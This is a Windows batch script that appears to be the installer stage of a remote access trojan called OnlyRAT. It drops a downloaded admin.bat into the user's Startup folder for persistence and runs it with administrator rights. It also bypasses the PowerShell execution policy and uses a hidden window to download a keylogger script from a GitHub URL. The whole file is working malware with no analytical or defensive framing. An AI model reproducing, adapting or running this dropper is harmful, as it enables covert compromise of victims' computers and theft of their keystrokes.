@echo off

REM Save the current directory
set "initialPath=%cd%"

REM Set the path for startup folder
set "startup=C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

REM Change directory to the startup folder
cd /d "%startup%"

REM Download the admin.bat file
powershell -c "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/Sayuru99/OnlyRAT/main/resources/admin/admin.bat', '%startup%\admin.bat')"

REM Run the admin.bat file as administrator
powershell -c "Start-Process cmd.exe -ArgumentList '/c \"%startup%\admin.bat\"' -Verb RunAs"

REM Wait for 10 seconds
timeout /t 10 > nul

REM Check if the directory C:\NewDirectory exists, if not, create it
powershell -Command "if (-not (Test-Path 'C:\NewDirectory')) { New-Item -Path 'C:\NewDirectory' -ItemType Directory }"

powershell -c "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/Sayuru99/OnlyRAT/main/resources/admin/admin.bat', '%startup%\admin.bat')"

REM Run InstallMdbc.ps1 script to install the Mdbc module
powershell -ExecutionPolicy Bypass -NoProfile -Command "& '%initialPath%\InstallMdbc.ps1'"

REM Import the Mdbc module
powershell -Command "Import-Module Mdbc"

REM Create wget.cmd script to download the keylogger.ps1 file
echo powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Sayuru99/OnlyRAT/main/resources/keylogger.ps1' -OutFile 'wget2.ps1'" > wget.cmd

REM Run wget.cmd script to download the keylogger.ps1 file
powershell -Command "Start-Process cmd.exe -ArgumentList '/c \"%startup%\wget.cmd\"' -WindowStyle Hidden"

REM Wait for 5 seconds
timeout /t 5 > nul

REM Change directory back to the initial directory
cd /d "%initialPath%"

REM Optionally delete the initial.cmd file
REM del initial.cmd
